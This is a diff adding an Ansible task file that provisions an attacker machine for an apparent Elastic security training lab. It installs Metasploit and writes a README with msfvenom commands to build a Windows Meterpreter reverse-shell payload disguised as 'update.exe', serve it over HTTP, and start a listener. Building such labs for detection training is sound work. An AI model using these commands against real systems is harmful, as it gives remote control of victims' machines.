@@ -1,0 +1,50 @@
+---
+- name: Update apt cache
+  apt:
+    update_cache: yes
+    cache_valid_time: 3600
+
+- name: Ensure Metasploit installed
+  apt:
+    name:
+      - metasploit-framework
+      - python3
+      - curl
+      - wget
+      - nmap
+    state: present
+
+- name: Create tools directory
+  file:
+    path: "{{ tools_directory }}"
+    state: directory
+    owner: "{{ kali_user }}"
+    group: "{{ kali_user }}"
+    mode: '0755'
+
+- name: Create helpful README
+  copy:
+    dest: "/home/{{ kali_user }}/ATTACKER_README.txt"
+    owner: "{{ kali_user }}"
+    group: "{{ kali_user }}"
+    mode: '0644'
+    content: |
+      ELASTIC SECURITY LAB - ATTACKER
+      
+      Generate payload:
+      msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.20.30.100 LPORT=4444 -f exe -o /tmp/update.exe
+      python3 -m http.server 8080
+      
+      Set up listener:
+      msfconsole -q
+      use exploit/multi/handler
+      set payload windows/meterpreter/reverse_tcp
+      set LHOST 10.20.30.100
+      set LPORT 4444
+      exploit -j
+
+- name: Initialize Metasploit database
+  shell: msfdb init
+  args:
+    creates: /usr/share/metasploit-framework/config/database.yml
+  become_user: "{{ kali_user }}"
